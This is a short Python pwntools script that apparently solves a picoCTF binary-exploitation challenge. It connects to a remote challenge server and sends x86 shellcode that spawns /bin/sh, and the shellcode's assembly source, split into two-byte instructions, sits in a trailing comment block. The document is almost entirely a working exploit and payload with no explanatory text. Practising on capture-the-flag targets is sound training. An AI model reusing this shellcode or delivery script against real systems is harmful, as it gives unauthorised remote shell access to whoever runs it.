#!/usr/bin/env python3

from pwn import *

#p = process("./fun")
p = remote("mercury.picoctf.net", 16460)

context.arch = 'x86'
#context.log_level = 'debug'

sc = "\x31\xC0\x50\x90\xB5\x68\xB1\x73\x66\x51\xB5\x2F\xB1\x2F\x66\x51\xB7\x6E\xB3\x69\x66\x53\xB5\x62\xB1\x2F\x66\x51\x89\xE3\x50\x90\x53\x90\x89\xE1\x89\xC2\xB0\x0B\xCD\x80"

p.sendlineafter(":", sc)

p.interactive()

"""
Shellcode

Refer: https://ctf.harrisongreen.me/2019/hxpctf/splitcode/

nasm -f elf32 separated.asm -o separated.o
ld -melf_i386 separated.o -o separated

section .text
        global _start

_start:
        xor eax, eax
        push eax
        nop
        mov ch, 0x68
        mov cl, 0x73
        push cx
        mov ch, 0x2f
        mov cl, 0x2f
        push cx
        mov bh, 0x6e
        mov bl, 0x69
        push bx
        mov ch, 0x62
        mov cl, 0x2f
        push cx
        mov ebx, esp
        push eax
        nop
        push ebx
        nop
        mov ecx, esp
        mov edx, eax
        mov al, 0xb
        int 0x80
"""
